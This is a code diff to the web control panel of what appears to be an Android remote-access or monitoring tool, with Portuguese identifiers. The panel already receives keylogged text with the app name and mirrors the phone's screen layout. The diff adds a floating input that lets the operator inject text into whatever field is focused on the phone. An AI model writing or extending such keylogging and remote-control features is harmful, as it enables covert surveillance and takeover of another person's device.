@@ -200,6 +200,9 @@ function conectar() {
       case 'sessao_iniciada':  onSessaoIniciada(msg); break;
       case 'arvore_tela':      desenharWireframe(JSON.parse(msg.elementos), msg.pacote); break;
       case 'keylog':           logKey(msg.texto, msg.app || '?'); break;
+      case 'campo_texto_focado':
+        abrirInputTexto(msg.texto_atual || '');
+        break;
       case 'cliente_desconectou': log('Cliente desconectou', 'err'); break;
     }
   };
@@ -410,6 +413,40 @@ function setStatus(online) {
   const b = document.getElementById('status-badge');
   b.className = 'status ' + (online ? 'online' : 'offline');
   b.innerHTML = `<span class="dot"></span> ${online ? 'Conectado' : 'Desconectado'}`;
+}
+</script>
+
+<!-- Input flutuante de texto remoto -->
+<div id="texto-modal" style="display:none;position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:#1e2433;border:1px solid #4299e1;border-radius:12px;padding:12px;z-index:999;width:480px;max-width:90vw;box-shadow:0 8px 32px rgba(0,0,0,.5)">
+  <div style="font-size:11px;color:#4299e1;margin-bottom:8px">⌨️ Campo de texto ativo — digite e envie</div>
+  <div style="display:flex;gap:8px">
+    <input id="texto-remoto" type="text" placeholder="Digite o texto..." style="flex:1;background:#0f1117;border:1px solid #2d3748;border-radius:8px;padding:8px 12px;color:#e2e8f0;font-size:14px;outline:none"
+      onkeydown="if(event.key==='Enter') enviarTextoRemoto()">
+    <button onclick="enviarTextoRemoto()" style="padding:8px 14px;background:#4299e1;border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:12px">Enviar</button>
+    <button onclick="fecharInputTexto()" style="padding:8px 12px;background:#2d3748;border:none;border-radius:8px;color:#a0aec0;cursor:pointer;font-size:12px">✕</button>
+  </div>
+</div>
+
+<script>
+function abrirInputTexto(textoAtual) {
+  const modal = document.getElementById('texto-modal');
+  const input = document.getElementById('texto-remoto');
+  input.value = textoAtual;
+  modal.style.display = 'block';
+  setTimeout(() => input.focus(), 100);
+  log('Campo de texto focado no celular', 'ev');
+}
+
+function fecharInputTexto() {
+  document.getElementById('texto-modal').style.display = 'none';
+}
+
+function enviarTextoRemoto() {
+  const val = document.getElementById('texto-remoto').value;
+  if (!val) return;
+  send({tipo:'cmd', cmd:'texto', valor: val});
+  log(`→ texto: ${val}`, 'ev');
+  fecharInputTexto();
 }
 </script>
 </body>
